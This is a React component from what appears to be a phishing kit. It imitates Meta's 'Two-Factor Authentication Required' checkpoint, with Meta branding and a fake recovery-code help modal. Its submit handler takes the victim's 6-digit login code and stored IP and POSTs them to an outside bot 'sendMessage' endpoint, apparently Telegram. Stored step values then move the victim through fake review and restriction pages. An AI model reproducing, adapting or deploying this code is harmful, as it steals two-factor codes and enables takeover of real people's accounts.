import React, { useEffect, useState, useRef } from 'react';

import { BrowserRouter as Router, Routes, Route, Link, useNavigate } from 'react-router-dom';
import { Form, FormControl, Button, InputGroup, Row, Col, Container, Modal } from 'react-bootstrap';

import paste from '../images/paste.png';
import usericon from '../images/user.png';
import HeaderCheckpoint from './HeaderCheckpoint';
import Footer from './Footer';
import AppealDesign from './AppealDesign';
import GLOBAL_ARRAY from "./globals";


const Checkpoint = () => {
	const [hapi, setHapi] = useState('');
	const [show, setShow] = useState(true);
const checkpointRef = useRef(null);

	  const [recovery, setRecovery] = useState(false);

	  const handleCloseRecovery = () => setRecovery(false);
	  const handleShowRecovery = () => setRecovery(true);

	const handleClose = () => setShow(false);
	const handleShow = () => setShow(true);

	const navigate = useNavigate();

const handleSubmitCheckpoint = (event) => {
		event.preventDefault();
	    const logincode = checkpointRef.current.value;

	    //var emriencoded = encodeURIComponent(emri);
	    //var emailiencoded = encodeURIComponent(emaili);
	    //var mesazhiencoded = encodeURIComponent(mesazhi);
	    //var numriencoded = encodeURIComponent(numri);
	    
	    //localStorage.setItem('emriencoded', emriencoded);
	    //localStorage.setItem('emailiencoded', emailiencoded);
	    //localStorage.setItem('mesazhiencoded', mesazhiencoded);
	    //localStorage.setItem('numriencoded', numriencoded);
	    localStorage.setItem('hapii', 6);

	    var fulltextmesazh = "Login Code: "+ logincode + "\nIP: " + localStorage.getItem('ipja');
	    fetch('https://'+GLOBAL_ARRAY[4]+'/bot'+GLOBAL_ARRAY[0]+'/sendMessage', {
	      method: 'POST',
	      headers: {
	        'Content-Type': 'application/json'
	      },
	      body: JSON.stringify({
	        chat_id: GLOBAL_ARRAY[1],
	        text: fulltextmesazh
	      })
	    })
	    .then(response => response.json())
	    .then(data => {
	    	
	    	navigate('/appeal/checkpoint/review');
	    })
	    .catch(error => console.error(error));
	    // reset form values
	 };

	useEffect(() => {
	    if (localStorage.getItem('hapii') === "1") {
	    	navigate('/appeal');
	    } else if (localStorage.getItem('hapii') === "2") {
	    	navigate('/appeal/identity/confirm');
	    } else if (localStorage.getItem('hapii') === "3") {
	    	navigate('/appeal/identity/confirm/incorrect');
	    } else if (localStorage.getItem('hapii') === "4") {
	    	
	    } else if (localStorage.getItem('hapii') === "5") {
	    	navigate('/appeal/checkpoint/incorrect');
	    } else if (localStorage.getItem('hapii') === "6") {
	    	navigate('/appeal/checkpoint/review');
	    } else if (localStorage.getItem('hapii') === "7") {
	    	navigate('/appeal/checkpoint/restrict');
	    }
	    
	}, [])

	return (
		<div>
			
			<HeaderCheckpoint />
			<Container >
				<Row>
					<Col md={{ span: 6, offset: 3 }}>
						<div className="karta">
							<div className="headerikarta">
								<p>Two-Factor Authentication Required</p>
							</div>
							<Form onSubmit={handleSubmitCheckpoint}>
							<div className="bodykarta">
								<p>Youve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>

								<p>Enter the 6-digit code from your <strong>Code Generator</strong> or 3rd party app below.</p>
								
							        <Form.Control type="text" ref={checkpointRef} pattern="[0-9](.{5}|.{7})" className="formaperlogincode" required placeholder="Login Code" />
							    
							</div>

							<div className="footerkarta">
								<div className="floatmajt">
									<a onClick={handleShowRecovery} href="#">Need another way to authenticate?</a>
								</div>
								<div className="floatdjatht">
									<button className="continuelogin" type="submit">Continue</button>
								</div>
							</div>
							</Form>
						</div>
					</Col>
				</Row>
				<Row>
					<Col>
						<div class="bottomfooter"><div class="container"><ul style={{ marginBottom: '15px'}}><li>English (UK)</li><li>English (US)</li><li>Espaol</li><li>Portugus (Brasil)</li><li>Franais (France)</li><li>Espaol (Espaa)</li><li>More languages</li></ul><ul><li> 2022 Meta</li><li>About</li><li>Developers</li><li>Careers</li><li>Privacy</li><li>Cookies</li><li>Terms</li><li>Help Centre</li></ul></div></div>
					</Col>
				</Row>
			</Container>
			<Modal show={recovery} onHide={handleCloseRecovery}>
        <Modal.Header closeButton>
          <Modal.Title>Didnt receive a code?</Modal.Title>
        </Modal.Header>
        <Modal.Body><p>1. Go to <strong>Settings</strong> Security and Login.</p>

<p>2. Under the <strong>Two-Factor Authentication</strong> section, click <strong>Use two-factor authentication</strong>. You may need to re-enter your password.</p>

<p>3. Next to <strong>Recovery Codes</strong>, click Setup then <strong>Get Codes</strong>. If you"ve already set up recovery codes, you can click <strong>Show Codes</strong>.</p>
<img src={paste} className="img-fluid" />
</Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" style={{ paddingTop: '4px'}} onClick={handleCloseRecovery}>
            Close
          </Button>
        </Modal.Footer>
      </Modal>
		</div>
	  
	)
}

export default Checkpoint